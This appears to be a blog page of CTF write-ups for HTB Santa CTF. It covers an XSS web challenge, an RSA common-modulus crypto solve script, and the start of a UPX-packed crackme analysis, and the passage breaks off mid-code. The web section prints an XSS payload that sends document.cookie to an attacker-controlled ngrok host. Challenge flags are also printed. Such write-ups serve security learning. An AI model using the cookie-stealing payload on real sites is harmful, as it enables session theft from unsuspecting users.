@@ -1,0 +1,547 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HTB Santa CTF DAY 1" /><meta property="og:locale" content="en" /><meta name="description" content="Toy Workshop [ Web ]" /><meta property="og:description" content="Toy Workshop [ Web ]" /><link rel="canonical" href="https://heapbytes.github.io/posts/DAY1/" /><meta property="og:url" content="https://heapbytes.github.io/posts/DAY1/" /><meta property="og:site_name" content="heapbytes" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-16T01:30:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB Santa CTF DAY 1" /><meta name="twitter:site" content="@heapbytes" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"mainEntityOfPage":{"@type":"WebPage","@id":"https://heapbytes.github.io/posts/DAY1/"},"description":"Toy Workshop [ Web ]","url":"https://heapbytes.github.io/posts/DAY1/","@type":"BlogPosting","headline":"HTB Santa CTF DAY 1","dateModified":"2022-01-27T10:49:12+05:30","datePublished":"2022-01-16T01:30:00+05:30","@context":"https://schema.org"}</script><title>HTB Santa CTF DAY 1 | heapbytes</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="heapbytes"><meta name="application-name" content="heapbytes"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://c.tenor.com/GmnuOLYMjxUAAAAC/demon-slayer-kimetsu-no-yaiba.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">heapbytes</a></div><div class="site-subtitle font-italic">The more I learn, the more I realise how much I don't know</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/heapbytes" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/heapbytes" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['heapbytes','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Santa CTF DAY 1 </span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB Santa CTF DAY 1</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/heapbytes">heapbytes</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-01-16 01:30:00 +0530" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 16, 2022, 1:30 AM +0530" >Jan 16, 2022</em> </span> <span> Updated <em class="timeago" date="2022-01-27 10:49:12 +0530 " data-toggle="tooltip" data-placement="bottom" title="Thu, Jan 27, 2022, 10:49 AM +0530" >Jan 27, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1547 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h1 id="toy-workshop--web-">Toy Workshop [ Web ]</h1><p><img data-src="https://user-images.githubusercontent.com/56447720/144388010-0a52a976-2014-4052-888c-cce6d567d3cd.png" alt="image" data-proofer-ignore></p><h2 id="homepage">Homepage<a href="#homepage" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="https://user-images.githubusercontent.com/56447720/144388506-ffff4770-6e36-4561-ab45-2d248bae31ae.png" alt="image" data-proofer-ignore></p><ul><li>The homepage had nothing intresting</ul><h2 id="source-code">Source Code<a href="#source-code" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><code class="language-plaintext highlighter-rouge">/web_toy_workshop/challenge/routes/index.js</code></ul><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="o">&lt;--</span><span class="nx">SNIPPED</span><span class="o">--&gt;</span>
+
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/submit</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+
+		<span class="kd">const</span> <span class="p">{</span> <span class="nx">query</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+		<span class="k">if</span><span class="p">(</span><span class="nx">query</span><span class="p">){</span>
+			<span class="k">return</span> <span class="nx">db</span><span class="p">.</span><span class="nx">addQuery</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span>
+				<span class="p">.</span><span class="nx">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+					<span class="nx">bot</span><span class="p">.</span><span class="nx">readQueries</span><span class="p">(</span><span class="nx">db</span><span class="p">);</span>
+					<span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Your message is delivered successfully!</span><span class="dl">'</span><span class="p">));</span>
+				<span class="p">});</span>
+		<span class="p">}</span>
+		<span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">'</span><span class="s1">Please write your query first!</span><span class="dl">'</span><span class="p">));</span>
+<span class="p">});</span>
+
+<span class="o">&lt;--</span><span class="nx">SNIPPED</span><span class="o">--&gt;</span>                    
+
+</pre></table></code></div></div><ul><li>So we have to send our query ( json data ) in <code class="language-plaintext highlighter-rouge">/api/submit</code><li>It’s a XSS</ul><h2 id="solution">Solution<a href="#solution" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nx">POST</span> <span class="o">/</span><span class="nx">api</span><span class="o">/</span><span class="nx">submit</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="p">:</span> <span class="mf">46.101</span><span class="p">.</span><span class="mf">20.5</span><span class="p">:</span><span class="mi">31726</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span><span class="nx">application</span><span class="o">/</span><span class="nx">json</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">130</span>
+
+<span class="p">{</span>
+  <span class="dl">"</span><span class="s2">query</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=this.src='&lt;IP&gt;/c?'+document.cookie;&gt;</span><span class="dl">"</span>
+<span class="p">}</span>
+
+</pre></table></code></div></div><ul><li>I used python3 http server with ngrok ( appended the link in <IP> )</IP></ul><h2 id="flag">Flag<a href="#flag" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>After you sent the the POST request to the website, It will use the query and store it in it’s database, and retrive the flag ( cookie ) for us</p><li><p>Start the python3 server , use ngrok , update the query</p></ul><p><img data-src="https://user-images.githubusercontent.com/56447720/144390423-6ef82ec3-5eaa-4383-b371-eb8c713049e5.png" alt="image" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="c"># flag : HTB{3v1l_3lv3s_4r3_r1s1ng_up!}</span>
+</pre></table></code></div></div><h1 id="common-mistake--crypto-">Common Mistake [ Crypto ]</h1><p><img data-src="https://user-images.githubusercontent.com/56447720/144392206-7c1df05c-1689-4b31-92ee-195227753a1d.png" alt="image" data-proofer-ignore></p><h2 id="challenge-files">Challenge files<a href="#challenge-files" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Hex values</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>
+{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}
+{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'}
+
+</pre></table></code></div></div><ul><li>Integer values</ul><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="n">n</span> <span class="o">=</span> <span class="mi">21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407</span>
+
+<span class="n">e1</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">e2</span> <span class="o">=</span> <span class="mi">35</span>
+<span class="n">c1</span> <span class="o">=</span> <span class="mi">10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428</span>
+
+<span class="n">c2</span> <span class="o">=</span> <span class="mi">15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856</span>
+
+</pre></table></code></div></div><h2 id="solution-1">Solution<a href="#solution-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>The encryption flag has 2 modulus with same flag ( message )<li>The attack used to get the flag is <code class="language-plaintext highlighter-rouge">Common Modulus Attack</code><li>Learn more about this attack : https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5</ul><h2 id="solvepy">Solve.py<a href="#solvepy" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre><td class="rouge-code"><pre>
+<span class="kn">import</span> <span class="nn">gmpy2</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">n</span> <span class="o">=</span> <span class="mi">21388731509885000178627064516258054470260331371598943108291856742436111736828979864010924669228672392691259110152052179841234423220373839350729519449867096270377366080249815393746878871366061153796079471618562067885157333408378773203102328726963273544788844541658368239189745882391132838451159906995037703318134437625750463265571575001855682002307507556141914223053440116920635522540306152978955166077383503077296996797116492665606386925464305499727852298454712455680910133707466125522128546462287576144499756117801116464261543533542827392699481765864054797509983998681705356909524163419157085924159390221747612487407</span>
+
+<span class="n">e1</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">e2</span> <span class="o">=</span> <span class="mi">35</span>
+<span class="n">c1</span> <span class="o">=</span> <span class="mi">10832767136661619622293208748444962392355211301390434120939858183061348121126484914263671262032603875084667844823015664447375648718327494489656817860025737727356822703892293211022320699697919627907394583787345038714333739600698382532854618636094930253033489471351451429607353151015568123268427367950348329135569722792929241394325167453525160818746481257803112384890621897151307914147207385945644054978785846514561379487923125221730977998641404608153621221989242862072038048891093337039913905830269768414927334743978508494831586214464123847828971941221037875260516473982025116976142753481691811417555124564400023181428</span>
+
+<span class="n">c2</span> <span class="o">=</span> <span class="mi">15339581512280546253022387613330506135473528946217386214104392886174532962135139018179028980415602501799731665623533337161466343141774695260798342966907592969192136730428838101668117599627074424456369362732331025534652310626217911372168741784410233370188819015541694457313359727564553135243865091813543574169503409997765186767976316668351998243685484183615633052413572395870658899189135714137152486690320920884963915388873421509027812888500063744545503640233833759600980489533968220839778372130766115290961393758948141655306677776381429819578626575875511596616706688649422193432129579216085481063417748767088461582856</span>
+
+<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+    
+<span class="k">def</span> <span class="nf">neg_pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+	<span class="k">assert</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="mi">0</span>
+	<span class="k">assert</span> <span class="n">GCD</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="p">.</span><span class="n">invert</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="n">b</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="n">n</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">common_modulus</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">):</span>
+	<span class="n">g</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">a</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+		<span class="n">c1</span> <span class="o">=</span> <span class="n">neg_pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+		<span class="n">c2</span> <span class="o">=</span> <span class="n">neg_pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+	<span class="n">ct</span> <span class="o">=</span> <span class="n">c1</span><span class="o">*</span><span class="n">c2</span> <span class="o">%</span> <span class="n">n</span>
+	<span class="n">m</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="p">.</span><span class="n">iroot</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span> <span class="n">g</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+	<span class="k">return</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">common_modulus</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="c"># Flag : HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}</span>
+</pre></table></code></div></div><h1 id="giftwrap--reversing-">Giftwrap [ Reversing ]</h1><p><img data-src="https://user-images.githubusercontent.com/56447720/149666955-e183ad60-55d9-44cc-a23a-c9c115ee7a6b.png" alt="image" data-proofer-ignore></p><h4 id="this-is-day-2-challenge">This is day 2 challenge<a href="#this-is-day-2-challenge" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><h2 id="binary-info">Binary Info<a href="#binary-info" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>strings giftwrap 
+&lt;<span class="nt">--SNIPPED--</span><span class="o">&gt;</span>
+A	?un
+G7FA	te
+who1D
+<span class="o">=</span>ddr
+<span class="o">}</span>643e
+Pb+4%
+to]<span class="s2">"
+-id%ABI-0
+2.OZo
+AIX5
+ot	+
+.bss
+!</span><span class="nv">$_</span><span class="se">\</span><span class="s2">
+K[lbO
+16 8
+,6H_
+^lOW
+s:m/
+UPX!
+UPX!
+             
+</span></pre></table></code></div></div><ul><li>by using strings we get to know the binary is compressed by UPX<li>What is UPX ?<blockquote><p>UPX achieves an excellent compression ratio and offers very fast decompression. Your executables suffer no memory overhead or other drawbacks for most of the formats supported, because of in-place decompression</p></blockquote></ul><h3 id="decompressing-the-binary">Decompressing the binary<a href="#decompressing-the-binary" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>upx <span class="nt">-d</span> giftwrap            
+                       Ultimate Packer <span class="k">for </span>eXecutables
+                          Copyright <span class="o">(</span>C<span class="o">)</span> 1996 - 2020
+UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   <span class="nt">--------------------</span>   <span class="nt">------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>
+    925312 &lt;-    357628   38.65%   linux/amd64   giftwrap
+
+Unpacked 1 file.
+
+</pre></table></code></div></div><h2 id="analyzing-binary">Analyzing Binary<a href="#analyzing-binary" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>./giftwrap 
+What<span class="s1">'s the magic word? asdf
+Wrong password! Who are you?!?
+                                    
+</span></pre></table></code></div></div><ul><li><p>The binary is a typical crackme challenge</p><li><p>Let’s boot up the binary in ghidra</p></ul><h3 id="main-function">Main function<a href="#main-function" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Each character of the user input is <code class="language-plaintext highlighter-rouge">xored</code> with <code class="language-plaintext highlighter-rouge">0xf3</code></ul><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="o">&lt;--</span><span class="n">SNIPPED</span><span class="o">--&gt;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s the magic word? "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%256s"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">user_input</span><span class="p">);</span>
+  <span class="n">local_11c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
